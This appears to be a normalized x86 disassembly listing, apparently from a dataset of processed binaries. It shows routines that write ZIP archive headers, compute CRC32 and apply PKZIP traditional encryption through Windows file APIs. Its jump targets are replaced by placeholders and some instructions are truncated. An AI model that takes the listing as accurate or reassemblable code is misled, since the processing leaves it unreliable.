je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0xa
pop ebx
pop ecx
retn
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ ebx + 0x13c ]
push eax
push ecx
push esi
call edi
mov ecx [ ebx + 0x1c ]
add esp 0xc
cmp eax ecx
je r-xdata
pop edi
pop esi
mov eax 0xa
pop ebx
pop ecx
retn
sub_404850
push ecx
push ebx
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ esp + 0x18 ]
lea eax [ esp + 0xf ]
push 0x1
push eax
push esi
mov [ esp + 0x1b ] 0x50
call edi
lea ecx [ esp + 0x1b ]
push 0x1
push ecx
push esi
mov [ esp + 0x27 ] 0x4b
call edi
lea edx [ esp + 0x34 ]
push 0x1
push edx
push esi
mov [ esp + 0x40 ] 0x7
call edi
lea eax [ esp + 0x40 ]
push 0x1
push eax
push esi
mov [ esp + 0x4c ] 0x8
call edi
mov ebx [ esp + 0x44 ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
mov cl [ ebx + 0xc ]
push esi
mov [ esp + 0x58 ] cl
call edi
mov eax [ ebx + 0xc ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x8
push esi
mov [ esp + 0x64 ] al
call edi
mov edx [ ebx + 0xc ]
add esp 0x48
lea eax [ esp + 0x1c ]
push 0x1
push eax
shr edx 0x10
push esi
mov [ esp + 0x28 ] dl
call edi
mov ecx [ ebx + 0xc ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x18
push esi
mov [ esp + 0x34 ] cl
call edi
mov al [ ebx + 0x10 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
push esi
mov [ esp + 0x40 ] al
call edi
mov edx [ ebx + 0x10 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x8
push esi
mov [ esp + 0x4c ] dl
call edi
mov ecx [ ebx + 0x10 ]
push 0x1
shr ecx 0x10
mov [ esp + 0x50 ] cl
lea edx [ esp + 0x50 ]
push edx
push esi
call edi
mov eax [ ebx + 0x10 ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x18
push esi
mov [ esp + 0x64 ] al
call edi
mov dl [ ebx + 0x14 ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push esi
call edi
mov ecx [ ebx + 0x14 ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x8
push esi
mov [ esp + 0x34 ] cl
call edi
mov eax [ ebx + 0x14 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
shr eax 0x10
push esi
mov [ esp + 0x40 ] al
call edi
mov edx [ ebx + 0x14 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x18
push esi
mov [ esp + 0x4c ] dl
call edi
add esp 0x30
xor eax eax
pop edi
pop esi
pop ebx
pop ecx
retn
sub_4049a0
push ecx
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x1c ]
lea eax [ esp + 0xf ]
push 0x1
push eax
push edi
mov [ esp + 0x1b ] 0x50
call ebx
lea ecx [ esp + 0x1b ]
push 0x1
push ecx
push edi
mov [ esp + 0x27 ] 0x4b
call ebx
lea edx [ esp + 0x34 ]
push 0x1
push edx
push edi
mov [ esp + 0x40 ] 0x1
call ebx
lea eax [ esp + 0x40 ]
push 0x1
push eax
push edi
mov [ esp + 0x4c ] 0x2
call ebx
mov esi [ esp + 0x44 ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
mov cl [ esi ]
push edi
mov [ esp + 0x58 ] cl
call ebx
xor eax eax
lea ecx [ esp + 0x58 ]
mov al [ esi + 0x1 ]
push 0x1
push ecx
push edi
mov [ esp + 0x64 ] al
call ebx
mov dl [ esi + 0x2 ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push edi
call ebx
xor ecx ecx
lea edx [ esp + 0x28 ]
mov cl [ esi + 0x3 ]
push 0x1
push edx
push edi
mov [ esp + 0x34 ] cl
call ebx
mov al [ esi + 0x4 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
push edi
mov [ esp + 0x40 ] al
call ebx
xor edx edx
lea eax [ esp + 0x40 ]
mov dl [ esi + 0x5 ]
push 0x1
push eax
push edi
mov [ esp + 0x4c ] dl
call ebx
mov cl [ esi + 0x6 ]
lea edx [ esp + 0x4c ]
push 0x1
mov [ esp + 0x50 ] cl
push edx
push edi
call ebx
xor eax eax
lea ecx [ esp + 0x58 ]
mov al [ esi + 0x7 ]
push 0x1
push ecx
push edi
mov [ esp + 0x64 ] al
call ebx
mov dl [ esi + 0x8 ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push edi
call ebx
mov ecx [ esi + 0x8 ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x8
push edi
mov [ esp + 0x34 ] cl
call ebx
mov eax [ esi + 0x8 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
shr eax 0x10
push edi
mov [ esp + 0x40 ] al
call ebx
mov edx [ esi + 0x8 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x18
push edi
mov [ esp + 0x4c ] dl
call ebx
mov cl [ esi + 0xc ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
push edi
mov [ esp + 0x58 ] cl
call ebx
mov eax [ esi + 0xc ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x8
push edi
mov [ esp + 0x64 ] al
call ebx
mov edx [ esi + 0xc ]
add esp 0x48
lea eax [ esp + 0x1c ]
push 0x1
push eax
shr edx 0x10
push edi
mov [ esp + 0x28 ] dl
call ebx
mov ecx [ esi + 0xc ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x18
push edi
mov [ esp + 0x34 ] cl
call ebx
mov al [ esi + 0x10 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
push edi
mov [ esp + 0x40 ] al
call ebx
mov edx [ esi + 0x10 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x8
push edi
mov [ esp + 0x4c ] dl
call ebx
mov ecx [ esi + 0x10 ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
shr ecx 0x10
push edi
mov [ esp + 0x58 ] cl
call ebx
mov eax [ esi + 0x10 ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x18
push edi
mov [ esp + 0x64 ] al
call ebx
mov dl [ esi + 0x14 ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push edi
call ebx
mov ecx [ esi + 0x14 ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x8
push edi
mov [ esp + 0x34 ] cl
call ebx
mov eax [ esi + 0x14 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
shr eax 0x10
push edi
mov [ esp + 0x40 ] al
call ebx
mov edx [ esi + 0x14 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x18
push edi
mov [ esp + 0x4c ] dl
call ebx
mov cl [ esi + 0x18 ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
push edi
mov [ esp + 0x58 ] cl
call ebx
mov eax [ esi + 0x18 ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x8
push edi
mov [ esp + 0x64 ] al
call ebx
mov dl [ esi + 0x20 ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push edi
call ebx
mov ecx [ esi + 0x20 ]
shr ecx 0x8
lea edx [ esp + 0x28 ]
push 0x1
push edx
push edi
mov [ esp + 0x34 ] cl
call ebx
mov al [ esi + 0x24 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
push edi
mov [ esp + 0x40 ] al
call ebx
mov edx [ esi + 0x24 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x8
push edi
mov [ esp + 0x4c ] dl
call ebx
mov cl [ esi + 0x28 ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
push edi
mov [ esp + 0x58 ] cl
call ebx
xor eax eax
lea ecx [ esp + 0x58 ]
mov al [ esi + 0x29 ]
push 0x1
push ecx
push edi
mov [ esp + 0x64 ] al
call ebx
mov dl [ esi + 0x2a ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push edi
call ebx
xor ecx ecx
lea edx [ esp + 0x28 ]
mov cl [ esi + 0x2b ]
push 0x1
push edx
push edi
mov [ esp + 0x34 ] cl
call ebx
mov al [ esi + 0x30 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
push edi
mov [ esp + 0x40 ] al
call ebx
mov edx [ esi + 0x30 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x8
push edi
mov [ esp + 0x4c ] dl
call ebx
mov ecx [ esi + 0x30 ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
shr ecx 0x10
push edi
mov [ esp + 0x58 ] cl
call ebx
mov eax [ esi + 0x30 ]
lea ecx [ esp + 0x58 ]
shr eax 0x18
push 0x1
mov [ esp + 0x5c ] al
push ecx
push edi
call ebx
mov dl [ esi + 0x34 ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push edi
call ebx
mov ecx [ esi + 0x34 ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x8
push edi
mov [ esp + 0x34 ] cl
call ebx
mov eax [ esi + 0x34 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
shr eax 0x10
push edi
mov [ esp + 0x40 ] al
call ebx
mov edx [ esi + 0x34 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x18
push edi
mov [ esp + 0x4c ] dl
call ebx
mov ecx [ esi + 0x18 ]
lea edx [ esi + 0x148 ]
push ecx
push edx
push edi
call ebx
mov ecx [ esi + 0x18 ]
add esp 0x3c
cmp eax ecx
jne r-xdata
pop edi
pop esi
mov eax 0xa
pop ebx
pop ecx
retn
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0x140 ]
push eax
push edi
call ebx
mov ecx [ esi + 0x20 ]
add esp 0xc
cmp eax ecx
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ esi + 0x144 ]
push eax
push ecx
push edi
call ebx
mov ecx [ esi + 0x24 ]
add esp 0xc
cmp eax ecx
jne r-xdata
sub_404d80
push ecx
push ebx
push esi
mov esi [ esp + 0x28 ]
push edi
mov edi [ esp + 0x28 ]
lea eax [ esp + 0xf ]
push 0x1
push eax
push esi
mov [ esp + 0x1b ] 0x50
call edi
lea ecx [ esp + 0x1b ]
push 0x1
push ecx
push esi
mov [ esp + 0x27 ] 0x4b
call edi
lea edx [ esp + 0x44 ]
push 0x1
push edx
push esi
mov [ esp + 0x50 ] 0x5
call edi
lea eax [ esp + 0x50 ]
push 0x1
push eax
push esi
mov [ esp + 0x5c ] 0x6
call edi
lea ecx [ esp + 0x5c ]
push 0x1
push ecx
push esi
mov [ esp + 0x68 ] 0x0
call edi
lea edx [ esp + 0x68 ]
push 0x1
push edx
push esi
mov [ esp + 0x74 ] 0x0
call edi
add esp 0x48
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x0
push 0x1
push eax
push esi
call edi
lea ecx [ esp + 0x38 ]
push 0x1
push ecx
push esi
mov [ esp + 0x44 ] 0x0
call edi
mov ebx [ esp + 0x2c ]
lea edx [ esp + 0x44 ]
push 0x1
push edx
push esi
mov [ esp + 0x50 ] bl
call edi
lea eax [ esp + 0x50 ]
push 0x1
sar ebx 0x8
push eax
push esi
mov [ esp + 0x5c ] bl
call edi
mov cl [ esp + 0x44 ]
lea edx [ esp + 0x44 ]
push 0x1
push edx
push esi
mov [ esp + 0x50 ] cl
call edi
lea eax [ esp + 0x50 ]
push 0x1
push eax
push esi
mov [ esp + 0x5c ] bl
call edi
mov ebx [ esp + 0x60 ]
add esp 0x48
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] bl
push 0x1
push ecx
push esi
call edi
mov edx ebx
lea eax [ esp + 0x20 ]
push 0x1
push eax
shr edx 0x8
push esi
mov [ esp + 0x2c ] dl
call edi
mov ecx ebx
lea edx [ esp + 0x2c ]
push 0x1
push edx
shr ecx 0x10
push esi
mov [ esp + 0x38 ] cl
call edi
lea eax [ esp + 0x38 ]
push 0x1
shr ebx 0x18
push eax
push esi
mov [ esp + 0x44 ] bl
call edi
mov ebx [ esp + 0x4c ]
lea ecx [ esp + 0x44 ]
push 0x1
push ecx
push esi
mov [ esp + 0x50 ] bl
call edi
mov edx ebx
lea eax [ esp + 0x50 ]
push 0x1
push eax
shr edx 0x8
push esi
mov [ esp + 0x5c ] dl
call edi
add esp 0x48
mov ecx ebx
lea edx [ esp + 0x14 ]
push 0x1
push edx
shr ecx 0x10
push esi
mov [ esp + 0x20 ] cl
call edi
lea eax [ esp + 0x20 ]
push 0x1
shr ebx 0x18
push eax
push esi
mov [ esp + 0x2c ] bl
call edi
mov ebx [ esp + 0x38 ]
lea ecx [ esp + 0x2c ]
push 0x1
push ecx
push esi
mov [ esp + 0x38 ] bl
call edi
mov edx ebx
lea eax [ esp + 0x38 ]
push 0x1
push eax
shr edx 0x8
push esi
mov [ esp + 0x44 ] dl
call edi
add esp 0x30
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ esp + 0x24 ]
push ebx
push ecx
push esi
call edi
add esp 0xc
cmp eax ebx
je r-xdata
pop edi
pop esi
mov eax 0xa
pop ebx
pop ecx
retn
sub_404f30
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x4 ]
push ebx
push esi
mov esi [ esp + 0x14 ]
cmp esi 0x8
not eax
jb r-xdata
xor eax eax
retn
test esi esi
je r-xdata
push edi
mov edi esi
shr edi 0x3
pop esi
pop ebx
not eax
retn
mov edx eax
xor ebx ebx
mov bl [ ecx ]
and edx 0xff
xor edx ebx
shr eax 0x8
mov edx [ edx * 4 + r--data ]
xor eax edx
inc ecx
dec esi
jne r-xdata
mov edx eax
xor ebx ebx
mov bl [ ecx ]
and edx 0xff
xor edx ebx
mov ebx eax
shr ebx 0x8
mov eax [ edx * 4 + r--data ]
sub esi 0x8
xor eax ebx
inc ecx
mov edx eax
xor ebx ebx
mov bl [ ecx ]
and edx 0xff
xor edx ebx
xor ebx ebx
mov bl [ ecx + 0x1 ]
mov edx [ edx * 4 + r--data ]
shr eax 0x8
xor edx eax
inc ecx
mov eax edx
and eax 0xff
xor eax ebx
xor ebx ebx
mov bl [ ecx + 0x1 ]
mov eax [ eax * 4 + r--data ]
shr edx 0x8
xor eax edx
inc ecx
mov edx eax
and edx 0xff
xor edx ebx
xor ebx ebx
mov bl [ ecx + 0x1 ]
mov edx [ edx * 4 + r--data ]
shr eax 0x8
xor edx eax
inc ecx
mov eax edx
and eax 0xff
xor eax ebx
xor ebx ebx
mov bl [ ecx + 0x1 ]
mov eax [ eax * 4 + r--data ]
shr edx 0x8
xor eax edx
inc ecx
mov edx eax
and edx 0xff
xor edx ebx
xor ebx ebx
mov bl [ ecx + 0x1 ]
mov edx [ edx * 4 + r--data ]
shr eax 0x8
xor edx eax
inc ecx
mov eax edx
and eax 0xff
xor eax ebx
xor ebx ebx
mov bl [ ecx + 0x1 ]
mov eax [ eax * 4 + r--data ]
shr edx 0x8
xor eax edx
inc ecx
mov edx eax
and edx 0xff
xor edx ebx
shr eax 0x8
mov edx [ edx * 4 + r--data ]
xor eax edx
inc ecx
dec edi
jne r-xdata
pop edi
sub_405070
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
mov edx [ ecx ]
and esi 0xff
mov eax edx
and eax 0xff
xor eax esi
shr edx 0x8
mov eax [ eax * 4 + r--data ]
xor eax edx
mov edx [ ecx + 0x4 ]
mov [ ecx ] eax
and eax 0xff
add eax edx
mov edx [ ecx + 0x8 ]
imul eax eax 0x8088405
inc eax
mov esi edx
mov [ ecx + 0x4 ] eax
and esi 0xff
shr eax 0x18
xor eax esi
pop esi
shr edx 0x8
mov eax [ eax * 4 + r--data ]
xor eax edx
mov [ ecx + 0x8 ] eax
retn
sub_4050f0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push esi
call sub_4050d0
mov ebx [ esp + 0x18 ]
push ebx
push esi
movsx edi al
call sub_405070
add esp 0xc
mov al bl
xor eax edi
pop edi
pop esi
pop ebx
retn
sub_405120
push ebx
mov ebx [ tolower@IAT ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x14 ]
sub ebp edi
jl r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
cmp esi eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
add edi 0x2
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
add edi 0x2
jmp r-xdata
xor eax eax
mov ax [ edi ]
push eax
call ebx
xor ecx ecx
mov esi eax
mov cx [ edi + ebp ]
push ecx
call ebx
add esp 0x8
cmp esi eax
jne r-xdata
sub_405180
push esi
push edi
mov edi [ esp + 0xc ]
push edi
call [ wcslen@IAT ]
lea esi [ edi + eax * 2 ]
add esp 0x4
cmp esi edi
jbe r-xdata
jne r-xdata
cmp [ esi ] 0x2e
je r-xdata
push rw-data
push esi
call sub_405120
add esp 0x8
test eax eax
jne r-xdata
cmp [ esi ] 0x2e
je r-xdata
cmp esi edi
sub esi 0x2
cmp esi edi
ja r-xdata
push rw-data
push esi
call sub_405120
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov al 0x1
pop esi
retn
pop edi
xor al al
pop esi
retn
push rw-data
push esi
call sub_405120
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov al 0x1
pop esi
retn
push rw-data
push esi
call sub_405120
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov al 0x1
pop esi
retn
push rw-data
push esi
call sub_405120
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov al 0x1
pop esi
retn
push rw-data
push esi
call sub_405120
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov al 0x1
pop esi
retn
push rw-data
push esi
call sub_405120
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov al 0x1
pop esi
retn
push rw-data
push esi
call sub_405120
add esp 0x8
test eax eax
pop edi
pop esi
sete al
retn
pop edi
mov al 0x1
pop esi
retn
sub_405270
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x4 ] ebx
jne r-xdata
pop edi
pop esi
mov eax 0x1000000
pop ebx
retn 0xc
cmp [ esi + 0xc ] ebx
jne r-xdata
cmp [ esi + 0x20 ] ebx
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
cmp [ esi + 0x14 ] ebx
jne r-xdata
cmp [ esi + 0x2c ] bl
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ esi + 0x8 ] bl
push eax
mov [ esi + 0x4 ] eax
call sub_4021c0
add esp 0x4
cmp eax 0xffffffff
setne cl
mov [ esi + 0x1c ] cl
pop edi
neg cl
sbb ecx ecx
and ecx eax
xor eax eax
mov [ esi + 0x10 ] ecx
pop esi
pop ebx
retn 0xc
cmp eax 0x3
jne r-xdata
push ebx
push 0x80
push eax
mov eax [ esp + 0x1c ]
push ebx
push ebx
push 0x40000000
push eax
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
mov [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
mov eax 0x10000
pop ebx
retn 0xc
mov edi [ esp + 0x14 ]
cmp edi ebx
jne r-xdata
mov [ esi + 0x1c ] 0x1
mov [ esi + 0x10 ] ebx
mov [ esi + 0x8 ] 0x1
pop edi
pop esi
xor eax eax
pop ebx
retn 0xc
mov [ esi + 0x4 ] ebx
pop edi
pop esi
mov eax 0x200
pop ebx
retn 0xc
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
mov eax 0x30000
pop ebx
retn 0xc
push ebx
push edi
push ebx
push 0x4
push ebx
push 0xffffffff
call [ CreateFileMappingW@IAT ]
cmp eax ebx
mov [ esi + 0xc ] eax
jne r-xdata
mov [ esi + 0x20 ] eax
push edi
push ebx
push ebx
push 0xf001f
push eax
call [ MapViewOfFile@IAT ]
cmp eax ebx
mov [ esi + 0x20 ] eax
jne r-xdata
pop edi
pop esi
mov eax 0x300
pop ebx
retn 0xc
mov [ esi + 0x28 ] edi
mov [ esi + 0x1c ] 0x1
mov [ esi + 0x24 ] ebx
pop edi
pop esi
xor eax eax
pop ebx
retn 0xc
mov ecx [ esi + 0xc ]
push ecx
call [ CloseHandle@IAT ]
mov [ esi + 0xc ] ebx
pop edi
pop esi
mov eax 0x300
pop ebx
retn 0xc
sub_4053d0
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
call sub_405420
test eax eax
je r-xdata
pop esi
retn
pop esi
retn
mov [ esi ] 0x0
sub_405420
push ebx
mov ebx ecx
push ebp
mov ebp [ esp + 0x10 ]
mov al [ ebx + 0x2d ]
push esi
mov esi [ esp + 0x10 ]
push edi
test al al
je r-xdata
mov edx [ ebx + 0x20 ]
test edx edx
je r-xdata
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x24 ]
mov edi [ ebx + 0x28 ]
lea ecx [ eax + ebp ]
cmp ecx edi
jb r-xdata
mov eax [ ebx + 0x3c ]
test eax eax
jne r-xdata
cmp [ ebx + 0x40 ] ebp
jae r-xdata
pop edi
pop esi
mov [ ebx + 0x14 ] 0x1000000
pop ebp
xor eax eax
pop ebx
retn 0x8
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push ebp
push esi
push eax
call [ WriteFile@IAT ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov ecx ebp
lea edi [ eax + edx ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x24 ]
pop edi
add eax ebp
pop esi
mov [ ebx + 0x24 ] eax
mov eax ebp
pop ebp
pop ebx
retn 0x8
pop edi
pop esi
mov [ ebx + 0x14 ] 0x30000
pop ebp
xor eax eax
pop ebx
retn 0x8
mov edi [ ebx + 0x3c ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
xor esi esi
test ebp ebp
jbe r-xdata
lea eax [ ebp + ebp ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebx + 0x3c ] eax
mov [ ebx + 0x40 ] ebp
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ ebx + 0x3c ] 0x0
mov esi [ ebx + 0x3c ]
lea edi [ ebx + 0x30 ]
mov eax [ ebx + 0x3c ]
mov cl [ esi + eax ]
push ecx
push edi
call sub_4050f0
mov edx [ ebx + 0x3c ]
add esp 0x8
mov [ esi + edx ] al
inc esi
cmp esi ebp
jb r-xdata
sub_405520
mov al [ ecx + 0x1c ]
test al al
jne r-xdata
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
mov [ ecx + 0x14 ] 0x2000000
xor al al
retn 0x4
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x28 ]
cmp eax edx
jb r-xdata
mov [ ecx + 0x14 ] 0x1000000
xor al al
retn 0x4
mov ecx [ ecx + 0x10 ]
mov edx [ esp + 0x4 ]
push 0x0
add ecx edx
push 0x0
push ecx
push eax
call [ SetFilePointer@IAT ]
mov al 0x1
retn 0x4
mov [ ecx + 0x24 ] eax
mov al 0x1
retn 0x4
mov [ ecx + 0x14 ] 0x30000
xor al al
retn 0x4
sub_405590
push ebx
push ebp
push esi
mov esi ecx
xor ebx ebx
xor ebp ebp
mov al [ esi + 0x2c ]
push edi
cmp al bl
jne r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x2c ] 0x1
cmp eax ebx
je r-xdata
call sub_406250
mov ebp eax
mov eax [ esi + 0xc ]
mov edi [ CloseHandle@IAT ]
cmp eax ebx
mov [ esi + 0x20 ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi + 0xc ] ebx
cmp eax ebx
je r-xdata
push eax
call edi
push eax
call [ UnmapViewOfFile@IAT ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
cmp [ esi + 0x8 ] bl
je r-xdata
push eax
call edi
sub_405600
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi ecx
xor ebx ebx
cmp eax ebx
push edi
mov [ esi + 0x70 ] ebx
mov [ esi + 0x78 ] ebx
mov [ esi + 0x74 ] bl
mov [ esi + 0x6c ] ebx
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x68 ] ebx
jne r-xdata
push ebx
push ebx
push 0x3
push ebx
push 0x1
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x10000
pop ebx
retn 0x4
push ebx
push edi
mov ecx esi
call sub_405690
mov ebp eax
cmp ebp ebx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x200
pop ebx
retn 0x4
mov [ esi + 0x74 ] 0x1
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x4
push edi
call [ CloseHandle@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn 0x4
sub_405690
push ebx
push ebp
push esi
mov esi ecx
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
lea ebp [ esi + 0x64 ]
cmp edi ebx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x78 ] ebx
mov [ esi + 0x74 ] bl
mov [ esi + 0x6c ] ebx
mov [ ebp ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x68 ] ebx
je r-xdata
mov eax 0x10000
cmp edi 0xffffffff
je r-xdata
mov eax [ esi + 0x4 ]
push 0x1
push ebx
push ebx
push eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x18 ]
mov [ esi + 0x4c ] 0x80000000
cmp eax ebx
mov [ ebp ] 0xffffffff
je r-xdata
lea ecx [ esi + 0x5c ]
lea edx [ esi + 0x50 ]
push ecx
push edx
lea eax [ esi + 0x4c ]
push ebp
push eax
push edi
call sub_4021e0
add esp 0x14
cmp eax ebx
jne r-xdata
lea ecx [ esp + 0x18 ]
mov [ esi + 0x60 ] bl
lea edx [ esp + 0x14 ]
lea ebx [ esi + 0x50 ]
push ecx
push edx
push ebx
call sub_402170
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov ebx [ ebx ]
and eax 0xffff
shl eax 0x10
and ecx 0xffff
add esp 0xc
or eax ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0x54 ] ebx
mov [ esi + 0x58 ] ebx
mov [ esi + 0x5c ] eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x8
mov [ ebp ] eax
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
push ebx
push ebx
push ebx
push edi
call [ SetFilePointer@IAT ]
mov [ esi + 0x70 ] edi
mov [ esi + 0x60 ] 0x1
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x8
sub_405780
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
xor eax eax
mov ecx [ esp + 0xc ]
cmp edx eax
mov [ esi + 0x70 ] eax
mov [ esi + 0x78 ] edx
mov [ esi + 0x74 ] al
mov [ esi + 0x6c ] eax
mov [ esi + 0x84 ] eax
mov [ esi + 0x68 ] eax
mov [ esi + 0x7c ] ecx
mov [ esi + 0x80 ] eax
je r-xdata
mov eax 0x10000
pop esi
retn 0x8
cmp ecx eax
je r-xdata
mov [ esi + 0x64 ] ecx
lea eax [ esp + 0xc ]
push edi
lea ecx [ esp + 0xc ]
lea edi [ esi + 0x50 ]
push eax
push ecx
push edi
mov [ esi + 0x4c ] 0x80000000
mov [ esi + 0x60 ] 0x1
call sub_402170
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
mov edi [ edi ]
and edx 0xffff
shl edx 0x10
and eax 0xffff
add esp 0xc
or edx eax
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edx
pop edi
xor eax eax
pop esi
retn 0x8
sub_405810
sub esp 0x8
xor eax eax
push esi
mov esi ecx
push edi
lea ecx [ esp + 0x8 ]
mov [ esi + 0x70 ] eax
mov [ esi + 0x78 ] eax
mov [ esi + 0x74 ] al
mov [ esi + 0x6c ] eax
mov [ esi + 0x84 ] eax
mov [ esi + 0x68 ] eax
mov [ esi + 0x64 ] eax
mov [ esi + 0x60 ] al
lea eax [ esp + 0xc ]
lea edi [ esi + 0x50 ]
push eax
push ecx
